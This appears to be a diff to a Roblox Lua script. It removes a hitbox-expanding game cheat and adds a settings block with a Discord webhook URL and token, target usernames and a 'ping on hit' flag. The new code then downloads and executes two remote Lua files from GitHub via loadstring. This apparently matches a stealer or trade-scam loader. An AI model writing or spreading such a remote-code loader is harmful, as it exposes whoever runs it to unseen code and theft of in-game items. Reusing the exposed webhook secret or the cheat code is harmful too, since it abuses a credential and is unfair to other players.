@@ -1,134 +1,16 @@
-local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
+-- SETTINGS
+_G.POOR_WEBHOOK = "https://discord.com/api/webhooks/1483413618941759641/ZgS4CNcmW3S0XvKtQ3eHR82Xfq-oRhNeuasMJF0AyYT7dg0FLOPUXsWwai55zyiRuEDF" -- Input Ur webhook Here
+_G.MY_USERNAMES = {"hello2342_jaw", "luyndory", "wowowowowowowqs"} -- YOUR own usernames
+_G.PING_POOR = true -- True/False To Ping @Everyone ON HIT
 
--- Global Variables
-_G.HitboxSize = 10
-_G.HitboxTransparency = 0.7 
-_G.HitboxEnabled = true
-
-local Window = Rayfield:CreateWindow({
-   Name = "Black Square Hitbox | Made by gg998",
-   LoadingTitle = "System Loading...",
-   LoadingSubtitle = "made by gg998",
-   ConfigurationSaving = {
-      Enabled = true,
-      FolderName = "gg998Scripts",
-      FileName = "HitboxConfig"
-   }
-})
-
-local MainTab = Window:CreateTab("Main Hub", 4483362458)
-
--- CREDITS SECTION
-MainTab:CreateSection("Credits")
-MainTab:CreateLabel("Script Author: gg998")
-
----
-
--- FOV SECTION
-MainTab:CreateSection("Field of View (FOV)")
-
-MainTab:CreateSlider({
-   Name = "Adjust FOV",
-   Range = {30, 120},
-   Increment = 1,
-   Suffix = "°",
-   CurrentValue = 70,
-   Flag = "FOVSlider",
-   Callback = function(Value)
-      game.Workspace.CurrentCamera.FieldOfView = Value
-   end,
-})
-
-MainTab:CreateInput({
-   Name = "Input FOV Value",
-   PlaceholderText = "Default: 70",
-   RemoveTextAfterFocusLost = false,
-   Callback = function(Text)
-      local num = tonumber(Text)
-      if num then game.Workspace.CurrentCamera.FieldOfView = num end
-   end,
-})
-
----
-
--- HITBOX SECTION (Black Square)
-MainTab:CreateSection("Black Hitbox Settings")
-
-MainTab:CreateToggle({
-   Name = "Hitbox Enabled",
-   CurrentValue = true,
-   Flag = "HitboxToggle",
-   Callback = function(Value)
-      _G.HitboxEnabled = Value
-      -- Reset logic when disabled
-      if not Value then
-         for _, v in next, game:GetService('Players'):GetPlayers() do
-            if v ~= game:GetService('Players').LocalPlayer then
-               pcall(function()
-                  v.Character.HumanoidRootPart.Size = Vector3.new(2, 2, 1)
-                  v.Character.HumanoidRootPart.Transparency = 1
-               end)
-            end
-         end
-      end
-   end,
-})
-
-MainTab:CreateSlider({
-   Name = "Hitbox Size",
-   Range = {2, 50},
-   Increment = 1,
-   Suffix = " Studs",
-   CurrentValue = 10,
-   Flag = "SizeSlider",
-   Callback = function(Value)
-      _G.HitboxSize = Value
-   end,
-})
-
-MainTab:CreateInput({
-   Name = "Input Hitbox Size",
-   PlaceholderText = "Default: 10",
-   RemoveTextAfterFocusLost = false,
-   Callback = function(Text)
-      local num = tonumber(Text)
-      if num then _G.HitboxSize = num end
-   end,
-})
-
-MainTab:CreateSlider({
-   Name = "Hitbox Darkness (Transparency)",
-   Range = {0, 100},
-   Increment = 1,
-   Suffix = "% Transparent",
-   CurrentValue = 70,
-   Flag = "TransSlider",
-   Callback = function(Value)
-      _G.HitboxTransparency = Value / 100
-   end,
-})
-
--- CORE LOGIC (Using RenderStepped for instant visual sync)
-game:GetService('RunService').RenderStepped:Connect(function()
-    if _G.HitboxEnabled then
-        for _, v in next, game:GetService('Players'):GetPlayers() do
-            if v.Name ~= game:GetService('Players').LocalPlayer.Name then
-                pcall(function()
-                    local hrp = v.Character.HumanoidRootPart
-                    hrp.Size = Vector3.new(_G.HitboxSize, _G.HitboxSize, _G.HitboxSize)
-                    hrp.Transparency = _G.HitboxTransparency
-                    hrp.BrickColor = BrickColor.new("Really black")
-                    hrp.Material = Enum.Material.Neon
-                    hrp.CanCollide = false
-                end)
-            end
-        end
-    end
+-- Load Main
+task.spawn(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Balsback7/Baddies/refs/heads/main/Free.lua", true))()
 end)
 
-Rayfield:Notify({
-   Title = "Success",
-   Content = "Script by gg998 has been loaded!",
-   Duration = 5,
-   Image = 4483362458,
-})
+task.wait(1)
+
+-- Load Gui
+task.spawn(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Balsback7/Baddies/refs/heads/main/gui.lua", true))()
+end)
